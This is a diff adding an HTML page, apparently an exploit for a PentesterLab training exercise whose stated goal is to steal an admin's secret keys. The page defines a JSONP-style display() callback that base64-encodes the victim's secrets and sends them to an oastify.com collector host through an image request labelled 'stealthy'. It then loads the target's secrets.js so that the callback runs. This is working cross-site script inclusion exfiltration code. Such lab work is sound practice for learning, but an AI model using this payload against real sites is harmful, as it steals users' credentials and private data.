@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Hyper Mega by PentesterLab: Secret Storage made easy</title>
+    <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="cVnpBEwovXV6k+XQmXOZRsmehj2mEJ+SKEF5XITN/BsqsMsJwM6rQOyd+hZqouW75A/NC2OVm9qgbM6GxTgBkQ==" />
+    
+
+    <link rel="stylesheet" media="all" href="/assets/application-7f3efcead33723e7a5674390ebbcbc7709e85f0cf36ad019d96a9771c4459ce0.css" data-turbolinks-track="reload" />
+    <script src="/assets/application-2956a20a5cb50337ac6a382f686727848744ee899590c63530f614403d98ad7a.js" data-turbolinks-track="reload"></script>
+    <script src="https://pentesterlab.com/tracking/xssi.js"></script>
+  </head>
+
+  <body>
+    <div class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-white border-bottom box-shadow">
+    <title></title>
+      <h5 class="my-0 mr-md-auto font-weight-normal"><a href="https://pentesterlab.com/">PentesterLab</a></h5>
+      <nav class="my-2 my-md-0 mr-md-3">
+        <a class="btn btn-outline-danger" href="/logout">Logout</a>
+      </nav>
+    </div>
+
+    <div class="container">
+<p id="notice"></p>
+
+<h1>Welcome to Secret Safe</h1>
+
+<p class="lead">Your goal is to steal the keys of the admin account</p>
+
+<h3>Manage your secrets</h3>
+
+<ul id="secrets"></ul>
+<script>
+function display(data) {
+  var payload = "";
+  for (var key in data) {
+    payload += key + ":" + data[key] + "\n";
+  }
+
+  var encoded = btoa(payload);
+
+  // Send via an image request (stealthy method)
+  var img = new Image();
+  img.src = "https://tmjdmxb1ud2mkbpev8qfwubn3e95xvlk.oastify.com/" + encoded;
+}
+</script>
+
+<a href="/secrets/new">Add a secret</a>
+<script src="https://ptl-891179ab6de0-1b388c446c46.libcurl.me/secrets.js">
+</script>
+
+</div>
+
+  </body>
+</html>
